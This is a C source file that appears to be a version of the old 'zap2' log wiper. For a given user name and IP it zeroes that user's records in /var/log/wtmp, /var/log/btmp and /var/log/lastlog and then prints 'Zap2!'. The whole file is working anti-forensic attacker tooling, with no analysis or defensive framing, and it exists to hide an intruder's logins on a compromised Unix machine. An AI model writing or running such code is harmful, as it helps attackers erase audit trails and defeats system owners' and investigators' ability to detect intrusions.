#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/file.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <utmp.h>
#include <pwd.h>
#include <lastlog.h>
#define WTMP_NAME "/var/log/btmp"
#define UTMP_NAME "/var/log/wtmp"
#define LASTLOG_NAME "/var/log/lastlog"
 
int f;
 
void kill_utmp(who, ip)
char *who;
char *ip;
{
    struct utmp utmp_ent;
 
  if ((f=open(UTMP_NAME,O_RDWR))>=0) {
     while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
       if (!strncmp(utmp_ent.ut_name,who,strlen(who)) && !strcmp(utmp_ent.ut_host, ip)) {
                 bzero((char *)&utmp_ent,sizeof( utmp_ent ));
                 lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
                 write (f, &utmp_ent, sizeof (utmp_ent));
            }
     close(f);
  }
}
 
void kill_wtmp(who)
char *who;
{
    struct utmp utmp_ent;
	char buf[448] = {0x0};
	memset(buf, 0, sizeof(buf));
 
  if ((f=open(WTMP_NAME,O_RDWR))>=0) {
     while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
       if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
                 bzero((char *)&utmp_ent,sizeof( utmp_ent ));
                 lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
                 //write (f, &utmp_ent, sizeof (utmp_ent));
                 write (f, buf, sizeof (buf));
            }
     close(f);
  }
}
 
void kill_lastlog(who)
char *who;
{
    struct passwd *pwd;
    struct lastlog newll;
 
     if ((pwd=getpwnam(who))!=NULL) {
 
        if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
            lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
            bzero((char *)&newll,sizeof( newll ));
            write(f, (char *)&newll, sizeof( newll ));
            close(f);
        }
 
    } else printf("%s: ?\n",who);
}
 
main(argc,argv)
int argc;
char *argv[];
{
    if (argc==3) {
        kill_lastlog(argv[1]);
        kill_wtmp(argv[1]);
        kill_utmp(argv[1], argv[2]);
        printf("Zap2!\n");
    } else
    printf("Error.\n");
}

